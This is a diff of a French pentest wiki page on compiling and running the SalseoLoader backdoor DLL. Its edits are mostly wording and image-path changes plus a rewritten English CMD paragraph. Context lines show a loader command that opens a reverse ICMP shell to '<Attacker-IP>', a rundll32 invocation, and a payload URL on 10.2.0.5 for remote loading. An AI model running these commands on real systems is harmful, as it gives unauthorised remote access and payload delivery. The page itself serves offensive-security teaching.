@@ -99,23 +99,23 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
-### Ajoutez avant la fonction principale: \[DllExport]
+### Ajoutez avant la fonction principale : \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Installez DllExport pour ce projet
 
 #### **Outils** --> **Gestionnaire de packages NuGet** --> **Gérer les packages NuGet pour la solution...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Recherchez le package DllExport (utilisez l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
+#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)
 
 Dans le dossier de votre projet, les fichiers suivants sont apparus : **DllExport.bat** et **DllExport\_Configure.bat**
 
-### **Désinstallez** DllExport
+### **Désinstallez DllExport**
 
 Appuyez sur **Désinstaller** (oui, c'est bizarre mais faites-moi confiance, c'est nécessaire)
 
@@ -143,7 +143,7 @@ Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Proprié
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Sélectionnez la **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
+Sélectionnez **Plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
@@ -174,19 +174,13 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
+CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a text-based interface for executing commands and performing various tasks. CMD can be used to navigate the file system, run programs, manage processes, and perform administrative tasks.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, including reconnaissance, privilege escalation, and data exfiltration.
+CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can exploit vulnerabilities, escalate privileges, and gain control over the target system.
 
-To exploit CMD, hackers often use backdoors to gain persistent access to a target system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can maintain access even if the system's security measures are strengthened or changed.
+To access CMD, simply open the Command Prompt application on a Windows machine. Once opened, you can start executing commands by typing them directly into the CMD window.
 
-There are several ways to create a backdoor for CMD. One common method is to modify the system's registry to execute a malicious script every time CMD is launched. Another method is to create a malicious executable file that is disguised as a legitimate system file.
-
-Once a backdoor is installed, hackers can use CMD to execute commands remotely, bypassing security measures and gaining control over the target system. This can be done by connecting to the target system using remote access tools or by exploiting vulnerabilities in network protocols.
-
-To protect against CMD backdoors, it is important to regularly update and patch the operating system, use strong passwords, and monitor system logs for any suspicious activity. Additionally, implementing network segmentation and access controls can help prevent unauthorized access to CMD and other critical system components.
-
-By understanding how CMD works and the potential risks associated with it, both system administrators and ethical hackers can better protect their systems and networks from unauthorized access and malicious activities.
+It is important to note that CMD should only be used for legitimate purposes, such as system administration or troubleshooting. Using CMD for malicious activities is illegal and unethical. Always ensure that you have proper authorization before using CMD on a target system.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
